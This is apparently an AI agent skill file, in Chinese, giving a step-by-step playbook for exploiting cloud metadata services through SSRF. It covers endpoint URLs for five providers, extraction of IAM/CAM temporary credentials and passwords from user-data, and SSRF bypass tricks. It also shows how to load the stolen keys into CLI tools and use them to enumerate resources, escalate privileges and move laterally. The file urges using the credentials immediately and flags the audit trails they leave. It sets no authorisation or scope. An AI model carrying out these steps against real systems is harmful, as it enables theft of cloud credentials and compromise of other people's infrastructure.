---
name: cloud-metadata
description: "云元数据利用。当通过 SSRF 或已获取的 shell 可以访问云实例元数据服务时使用。覆盖 AWS/Azure/GCP/阿里云/腾讯云的元数据端点、IAM/CAM 凭据提取、IMDSv2 绕过、从元数据到云服务枚举的完整攻击链。发现任何 SSRF 场景、内网可访问 169.254.169.254 或 100.100.100.200 的场景都应使用此技能"
metadata:
  tags: "cloud,metadata,ssrf,iam,cam,aws,azure,gcp,aliyun,tencent,腾讯云,imds,元数据,云安全"
  category: "cloud"
---

# 云元数据利用方法论

IMDS 是从 SSRF/RCE 到云控制面的桥梁——一个 HTTP 请求就能获取 IAM/CAM 临时凭据。

## ⛔ 深入参考（必读）

- 各云平台凭据提取详细命令、AWS/腾讯云快速利用、元数据信息路径 → [references/credential-extraction.md](references/credential-extraction.md)

---

## Phase 1: 确认云环境

| 线索 | 云平台 |
|------|--------|
| `x-amz-*` Header, `Server: AmazonS3` | AWS |
| `x-ms-*` Header, `.azurewebsites.net` | Azure |
| `.googleapis.com`, `x-goog-*` Header | GCP |
| `.aliyuncs.com`, `x-oss-*` Header | 阿里云 |
| `.myqcloud.com`, `x-cos-*` Header, `Server: tencent-cos` | 腾讯云 |

## Phase 2: 元数据端点速查

```
# AWS (IMDSv1 — 直接 GET)
http://169.254.169.254/latest/meta-data/

# AWS (IMDSv2 — 需要 PUT 获取 Token)
PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true

# GCP
http://metadata.google.internal/computeMetadata/v1/
  Header: Metadata-Flavor: Google

# 阿里云
http://100.100.100.200/latest/meta-data/

# 腾讯云（CVM/轻量应用服务器/Lighthouse）
http://metadata.tencentyun.com/latest/meta-data/
# 也可通过 IP 访问
http://169.254.0.23/latest/meta-data/
```

### 腾讯云元数据完整路径

```
# 基础信息
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/instance-id
http://metadata.tencentyun.com/latest/meta-data/uuid
http://metadata.tencentyun.com/latest/meta-data/hostname
http://metadata.tencentyun.com/latest/meta-data/local-ipv4
http://metadata.tencentyun.com/latest/meta-data/public-ipv4
http://metadata.tencentyun.com/latest/meta-data/instance-type

# 区域信息
http://metadata.tencentyun.com/latest/meta-data/placement/region
http://metadata.tencentyun.com/latest/meta-data/placement/zone

# 网络（需先获取 MAC 地址）
http://metadata.tencentyun.com/latest/meta-data/mac
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/local-ipv4

# CAM 角色凭据（关键攻击面！）
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
# ↑ 列出挂载的角色名称

http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
# ↑ 返回临时凭据: TmpSecretId, TmpSecretKey, Token, ExpiredTime

# 用户数据（启动脚本——经常包含密码！）
http://metadata.tencentyun.com/latest/user-data
```

## Phase 3: SSRF → 元数据

- 直接用 SSRF 请求 `http://169.254.169.254/...`（AWS/Azure/GCP）
- 直接用 SSRF 请求 `http://metadata.tencentyun.com/...`（腾讯云，域名方式）
- 直接用 SSRF 请求 `http://100.100.100.200/...`（阿里云）
- **IMDSv2 需要 PUT + 自定义 Header** → 大多数 SSRF 无法设置 Header，这是 IMDSv2 的防护价值
- 绕过：`http://[::ffff:169.254.169.254]/`、DNS rebinding、302 重定向
- **腾讯云和阿里云的元数据服务不需要特殊 Header**（与 IMDSv1 类似，更容易被 SSRF 利用）

## Phase 4: 凭据利用决策树

```
获取到凭据？
├─ AWS → export 环境变量 → aws sts get-caller-identity → 枚举 S3/EC2/Lambda/Secrets
├─ Azure → Bearer Token → 枚举资源
├─ GCP → OAuth Token → 枚举项目资源
├─ 阿里云 → STS Token → 枚举 OSS/ECS
└─ 腾讯云 → 配置 tccli → 枚举 COS/CVM/SCF/CAM
    ├─ tccli configure（交互式）或设置环境变量
    ├─ tccli sts GetCallerIdentity（验证身份）
    ├─ coscli ls 或 Python SDK（列出存储桶，tccli 不支持 GetService）
    ├─ tccli cvm DescribeInstances（列出实例）
    └─ → 转入 cloud-iam-audit 技能进行提权评估
详细命令 → [references/credential-extraction.md](references/credential-extraction.md)
```

### 腾讯云凭据快速配置

```bash
# 方式 1: tccli configure
tccli configure
# SecretId: 从元数据获取的 TmpSecretId
# SecretKey: 从元数据获取的 TmpSecretKey
# token: 从元数据获取的 Token
# Region: 从元数据 placement/region 获取

# 方式 2: 环境变量（适合脚本化）
export TENCENTCLOUD_SECRET_ID="TmpSecretId"
export TENCENTCLOUD_SECRET_KEY="TmpSecretKey"
export TENCENTCLOUD_SESSION_TOKEN="Token"

# 验证
tccli sts GetCallerIdentity
```

获取云凭据后，进行 IAM 提权评估。

## 注意事项
- **IMDSv2** 是 AWS 对元数据 SSRF 的主要防护——纯 SSRF 基本无法利用
- **腾讯云和阿里云元数据不强制 Token**，SSRF 利用门槛更低
- 云凭据有过期时间（通常 6-12 小时），获取后应**立即利用**
- 凭据操作会留下 CloudTrail/CloudAudit 日志，注意操作痕迹
- **User-Data** (`/latest/user-data`) 经常包含启动脚本中的密码
- 腾讯云元数据域名 `metadata.tencentyun.com` 只能在实例内网访问

## 后续利用
- 获取云凭据后可进行横向移动，访问更多云资源
- 腾讯云: 凭据 → tccli/coscli 枚举 COS → 搜索敏感数据 → CAM 提权
- AWS: 凭据 → awscli 枚举 S3/EC2/Lambda → IAM 提权
